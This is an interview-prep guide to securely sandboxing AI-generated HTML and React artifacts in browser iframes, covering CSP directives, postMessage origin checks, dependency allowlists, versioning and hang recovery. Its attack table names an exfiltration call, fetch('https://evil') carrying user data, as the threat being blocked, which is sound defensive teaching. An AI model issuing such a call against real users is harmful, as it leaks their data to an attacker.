# Section 4 — Artifacts & Sandboxed Rendering

Interview-prep system design answers for Claude-style AI chat frontends.

---

## How do you safely render Claude-generated HTML or React in the browser?

Never inject model output into the host app’s DOM with `innerHTML` or `dangerouslySetInnerHTML`. Treat every artifact as untrusted code: run it in a dedicated **origin-isolated preview** (sandboxed `iframe` or a Web Worker + OffscreenCanvas for canvas-only cases), not in the chat shell where session cookies, `localStorage`, and the parent’s CSP live.

For **HTML artifacts**, the host writes a minimal bootstrap document into the iframe via `srcdoc` or a `blob:` URL, then streams or patches body content. For **React artifacts**, compile in a controlled pipeline: Babel/SWC in a worker, bundle with a fixed allowlist of imports (`react`, `react-dom`, your shimmed `lucide-react`, etc.), and load the bundle inside the sandbox. The preview runtime should expose only whitelisted globals—no raw `fetch` to arbitrary origins unless you add an audited proxy.

Defense in depth: `sandbox` attribute on the iframe, strict **Content-Security-Policy** on the iframe document, separate subdomain (`preview.app.example.com`) so cookies are not sent, and optional **Trusted Types** on the host to block accidental sinks. User edits and model regenerations both flow through the same sanitizer/compiler so “trusted user” never bypasses isolation.

**Security tradeoff:** Full React fidelity (hooks, concurrent features, devtools) costs complexity; a lighter “HTML + inline script” sandbox is simpler but easier to misconfigure. Production systems almost always choose iframe + compile step over direct DOM mounting.

---

## Why use an iframe sandbox — what attacks does it prevent?

An iframe with `sandbox` creates a separate browsing context with a capability token you grant explicitly. Default sandbox blocks almost everything; you add only what the preview needs.

Typical attribute set:

```html
<iframe
  sandbox="allow-scripts allow-forms"
  referrerpolicy="no-referrer"
  csp="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' blob:; style-src 'unsafe-inline'; img-src blob: data:;"
></iframe>
```

**Attacks mitigated:**

| Attack | Without sandbox | With sandbox + CSP |
|--------|-----------------|---------------------|
| Session hijack via `document.cookie` on parent origin | Parent readable if same-origin | Cross-origin iframe cannot read parent cookies |
| Phishing / UI redress | Fullscreen overlay mimicking app chrome | `allow-top-navigation` omitted; no top-level navigate |
| Drive-by download / plugin abuse | Legacy vectors | Sandboxed docs restricted |
| XSS → exfiltration to attacker origin | `fetch('https://evil')` with user data | CSP `connect-src` blocks; no cookies on preview origin |
| `window.opener` / `parent` manipulation | `parent.postMessage` still possible but origin-checked | No direct DOM access to parent |
| Form POST to attacker | Auto-submit credentialed forms | `allow-forms` only if needed; separate origin = no cookies |
| Popups / tab hijack | `window.open` | Omit `allow-popups` unless required |

**What sandbox does not fix:** CPU/memory exhaustion (infinite loops), crypto mining in allowed scripts, or **postMessage** bugs if the host accepts messages without verifying `event.origin`. Treat `allow-same-origin` as dangerous—it lets the iframe escape to a real origin and regain storage; prefer `srcdoc`/`blob:` on a null origin or dedicated preview subdomain without `allow-same-origin` unless you have a hard requirement.

**Tradeoff:** `allow-scripts` is required for React but enables computation abuse; pair with timeouts, `requestIdleCallback` budgets, or worker-based compilation outside the iframe.

---

## How do you stream code into a live-reloading preview panel?

Split the pipeline into **ingest → debounce → compile → push → render**, with clear backpressure so token storms do not melt the UI.

1. **Ingest:** As the assistant streams an artifact block (fenced code or structured `artifact` JSON), append to a buffer in the editor model (Monaco/CodeMirror). Partial syntax is expected; do not compile on every token.
2. **Debounce:** 150–300 ms trailing debounce, or “compile when fence closes / artifact tool completes.” For structural edits, cancel in-flight compile via `AbortController`.
3. **Compile:** Worker runs transpile + esbuild-wasm (or server-side compile for heavy deps). Output: JS string + CSS + source map.
4. **Push:** Host sends `postMessage({ type: 'ARTIFACT_UPDATE', version, payload })` to the iframe, or hot-swaps a `blob:` URL with cache-bust query. Iframe replaces module via a small HMR runtime (`import.meta.hot` shim) or full document reload for HTML.
5. **Render:** Iframe mounts React root once; subsequent updates call `root.render(<App />)` with error boundary.

For **live reload during streaming**, show a “compiling…” badge when debounce timer is active; on syntax error, show inline overlay in the preview without crashing the host. Version monotonically increases so stale compile results are ignored (`if (version < latestVersion) return`).

**Tradeoff:** Full reload is simpler and clears bad state; HMR is smoother but can leak state across buggy components—expose a “hard refresh preview” control.

---

## How does `postMessage` work between the host page and the sandboxed iframe?

`window.postMessage(message, targetOrigin)` sends a structured-cloneable payload across browsing contexts. The iframe’s `contentWindow.postMessage` and the parent’s `window.addEventListener('message', handler)` form a narrow API bridge—no shared DOM.

**Contract design:**

```ts
// Host → iframe
iframe.contentWindow?.postMessage(
  { source: 'claude-host', type: 'RUN', code, css, version },
  previewOrigin // e.g. 'https://preview.example.com' or '*' only in dev
);

// iframe → host
parent.postMessage(
  { source: 'artifact-preview', type: 'READY' | 'ERROR' | 'CONSOLE', ... },
  parentOrigin
);
```

**Host handler (mandatory checks):**

```ts
window.addEventListener('message', (e) => {
  if (e.origin !== PREVIEW_ORIGIN) return;
  if (e.data?.source !== 'artifact-preview') return;
  // handle READY, ERROR, resize, etc.
});
```

Use typed message enums, max payload size, and ignore unknown types. For resize-to-fit, iframe sends `height` after `ResizeObserver` on `document.body`; host sets iframe CSS height (still no DOM access).

**Why not `*` in production:** Any embed or extension could spoof messages. Lock `targetOrigin` to the preview subdomain. **Tradeoff:** `srcdoc` iframes often report `origin 'null'`—standardize on `blob:` + registered origin or `allow-same-origin` on a dedicated preview origin only, never on the main app origin.

---

## How do you version artifacts — user edits vs Claude regenerates?

Treat an artifact as a **document with a linear version chain** plus metadata: `artifactId`, `version`, `parentVersion`, `author` (`user` | `assistant` | `system`), `timestamp`, and optional `messageId` / `toolCallId` linking to the chat turn that produced it.

| Event | Versioning behavior |
|-------|---------------------|
| User edits in Monaco | New version `v+1`, `author: user`, `parent: current` |
| User clicks “Revert” then edits | Branch or overwrite policy (see revert question) |
| Claude regenerates whole artifact | New version `author: assistant`, `parent: v_before_regen` |
| Claude partial patch (search/replace tool) | New version with diff applied; store patch in metadata |
| Concurrent edit while model streams | Optimistic lock: `baseVersion` on save; reject or merge |

**UI:** Timeline slider or version dropdown (“v3 — you, 2m ago”, “v4 — Claude”). Default display is HEAD; comparing v2 vs v4 is a read-only diff mode. **Storage:** Postgres `artifact_versions` table or object store keyed by `artifactId/version`; content-addressable hash for dedup. Chat messages reference `artifactId@version` so replaying history renders the correct snapshot, not always latest.

**Tradeoff:** Branching (git-style) helps power users but complicates merge; linear history with explicit “fork as new artifact” is easier to explain in interviews.

---

## What CSP headers do you set on the sandboxed iframe and why?

Apply CSP to the **preview document** (via `<meta http-equiv="Content-Security-Policy">` in injected HTML, `Content-Security-Policy` response header on `preview.example.com`, or iframe `csp` attribute where supported). Example policy for a React artifact runner:

```
default-src 'none';
script-src 'unsafe-inline' 'unsafe-eval' blob:;
style-src 'unsafe-inline';
img-src blob: data: https:;
font-src data:;
connect-src 'none';
frame-src 'none';
object-src 'none';
base-uri 'none';
form-action 'none';
```

**Rationale per directive:**

- **`default-src 'none'`** — Fail closed; whitelist only what you need.
- **`script-src` with `'unsafe-eval'`** — Often required for Babel-in-browser or `new Function`; **tradeoff:** weakens XSS containment—prefer precompiled bundles in the worker and drop `'unsafe-eval'` in hardened mode.
- **`'unsafe-inline'`** — Needed for `srcdoc` bootstrap; long-term replace with nonces/hashes on a static shell.
- **`connect-src 'none'`** — Blocks exfiltration `fetch`/XHR/WebSocket unless you operate an allowlisted **CDN proxy** (see next question).
- **`img-src` / `font-src`** — Tight but allow `data:` for charts/icons.
- **`frame-src 'none'`** — Prevents nested sandbox escapes and clickjacking chains.
- **`base-uri 'none'`** — Stops `<base href>` hijacking relative URLs.

On the **host app**, use a stricter CSP (no `'unsafe-eval'`), `frame-src https://preview.example.com`, and `frame-ancestors 'none'`. Report violations to `/csp-report` for tuning.

---

## How do you handle an artifact that imports an external CDN library — allow or block?

**Default: block direct CDN `import` in the sandbox** (`connect-src 'none'`, no dynamic `import()` to `https://unpkg.com`). Model-generated code often requests `react`, `three`, `d3` from CDNs; allowing arbitrary URLs is supply-chain risk (CDN compromise, typosquatting, tracking pixels).

**Recommended architecture — curated dependency proxy:**

1. Maintain an **allowlist** (`react@18.2.0`, `react-dom`, `chart.js`, …) pinned by SRI hash.
2. At compile time, resolve `import 'react'` to a **bundled copy** served from your origin (`/vendor/react@18.2.0/esm.js`), not the model’s URL.
3. Optional **esbuild pre-bundle** step in the worker injects externals from cache.
4. If the model insists on an unknown package, show “dependency not allowed” with suggest alternatives; or queue **human approval** for one-off fetch (enterprise).

**When to allow CDN (interview nuance):** Internal tools with signed URLs and CSP `connect-src https://cdn.yourcorp.com` plus **Subresource Integrity** on `<script src>`—still prefer first-party hosting. **Never** `allow-same-origin` + arbitrary `script-src https://*`—that recreates a full browser on your preview origin.

**Tradeoff:** Larger initial bundle vs security; caching vendored ESM on CDN you control is the sweet spot for Claude-style artifacts.

---

## How do you diff two versions of an artifact and show a visual changelog?

**Text layer:** Store each version as UTF-8 text. Compute diff with Myers (`diff` lib) or semantic diff for JSON/AST (Tree-sitter for JSX). Produce a unified diff or array of hunks `{ type: 'add'|'remove'|'equal', value }`.

**Editor UI:** Monaco `diffEditor` with `original` = vN, `modified` = vM; inline gutter colors. Side-by-side for wide screens, inline for mobile.

**Visual changelog (product polish):**

1. **Summary panel** — “+42 −18 lines”, list of hunks with AI one-liner optional (“changed button color”, “added useEffect”).
2. **Structural diff for React** — Parse both to AST (babel/parser); show component-level chips (“`App`: props changed”, “new child `Chart`”) instead of raw line noise.
3. **Preview diff** — Run both versions in two hidden iframes, `html2canvas` or DOM snapshot compare (expensive); or screenshot on save. Highlight regions with overlay rects—good for HTML/CSS artifacts, heavy for SPAs.
4. **Semantic CSS** — Diff extracted `<style>` blocks; preview highlights affected selectors.

Persist diff metadata lazily when vM is created (`diff_parent_v{N-1}_vM.json`) to avoid recomputation. **Tradeoff:** AST diff is interview gold but costly; line diff + Monaco is the MVP senior engineers ship first.

---

## How do you sync scroll position between the code editor and the rendered preview?

**Problem:** Line numbers in code do not map 1:1 to DOM nodes in preview (transpilation, wrappers, CSS). True bidirectional sync requires **source maps** and optional **instrumentation**.

**Practical approaches:**

1. **Source map anchoring (best for React):** Emit inline `//# sourceMappingURL` from compile. On preview click or element select, resolve generated position → original line/column; `editor.revealLineInCenter(line)`. Reverse: cursor in editor → optional highlight DOM node via `data-source-line` injected by a Babel plugin in dev preview mode.

2. **Block-level sync (MVP):** Split artifact into cells (markdown-style) or top-level components; maintain `lineRanges[]` per component from AST. Scrolling editor into “Section B” scrolls preview to `#section-b` via `postMessage({ type: 'SCROLL_TO', id })`.

3. **Scroll coupling (weak):** Proportional scroll `preview.scrollTop = (editor.scrollTop / editorScrollHeight) * previewScrollHeight`—fragile but zero instrumentation; mention as fallback only.

4. **Locked scroll mode:** Checkbox “sync scroll”; throttle `scroll` events to 50 ms; detach when user scrolls preview independently (break lock until re-enabled).

Implementation: editor `onDidScrollChange` → host → iframe handler calls `element.scrollIntoView()`. Preview sends `HIGHLIGHT_LINES { start, end }` for hover reverse-sync. **Tradeoff:** Instrumentation increases bundle size; gate behind dev/preview mode.

---

## How do you handle an infinite loop inside a sandboxed React component?

Sandboxing contains **security** impact but not **availability**—a tight `while(true)` or `useEffect` without deps still freezes the iframe’s main thread.

**Detection stack:**

1. **Heartbeat / watchdog:** Iframe script sets `setInterval(() => parent.postMessage({ type: 'PING', t: Date.now() }), 500)`. Host starts timer on `RUN`; if no `PING` for 2–3 s, declare hang.
2. **Render budget:** Wrap `root.render` in `requestAnimationFrame` loop counting frames; > N frames without idle → treat as hang (heuristic for tight React re-render loops).
3. **Worker isolation (advanced):** Run React in a Worker with OffscreenCanvas—rare for general artifacts; mention as future path.

**Recovery:**

- `iframe.contentWindow?.postMessage({ type: 'TERMINATE' })` is ineffective if thread is blocked—**terminate the iframe**: `iframe.remove()` and insert fresh sandbox, restore last known good version from `version - 1`.
- Show Error overlay: “Preview stopped responding — infinite loop suspected” with actions **Reset preview** / **Edit code**.
- Optional **static analysis** before run: ESLint `react-hooks/exhaustive-deps`, detect obvious `useEffect(() => { setX(x+1) })` patterns—advisory only.

**Tradeoff:** Aggressive timeouts false-positive on slow devices; scale timeout with artifact complexity and show indeterminate progress for legitimate long mounts (Three.js).

---

## How do you implement a "revert to version N" for an artifact?

**Data model:** Immutable versions; revert does not delete vN+1…vM—it creates **vM+1` whose content equals vN** (preferred) or moves a `head` pointer (simpler, loses forward history visibility).

**Preferred flow (copy-on-write):**

1. User selects version N in timeline → “Restore this version”.
2. Server/client creates `version = M+1`, `parent = currentHead`, `content = copy(versions[N].content)`, `author = user`, `revertedFrom = N`.
3. Editor buffer replaces with restored content; preview compiles with `version M+1`.
4. Chat optional system line: “Restored artifact to v3 (snapshot from 10:42).”

**Pointer-only flow:** `artifacts.head_version = N`—fast but hides newer versions from default UI unless you show “future versions discarded” warning.

**Conflict rules:** If Claude streams a new version while user reverts, `baseVersion` check rejects silent overwrite; show merge dialog. **Undo revert:** Because history is linear/immutable, “undo” is just another restore to pre-revert version.

**Permissions:** Revert is a user action; audit log stores `revertedFrom`. For collaborative artifacts, broadcast revert via CRDT/WebSocket so all clients jump to the new head.

**Tradeoff:** Copy-on-write uses more storage but matches user mental model (“I went back”) and keeps forward history for forensics; essential for interview discussion of Claude-style document tools.

---

*Section 4 complete — Core (5) + Deep (6) questions.*
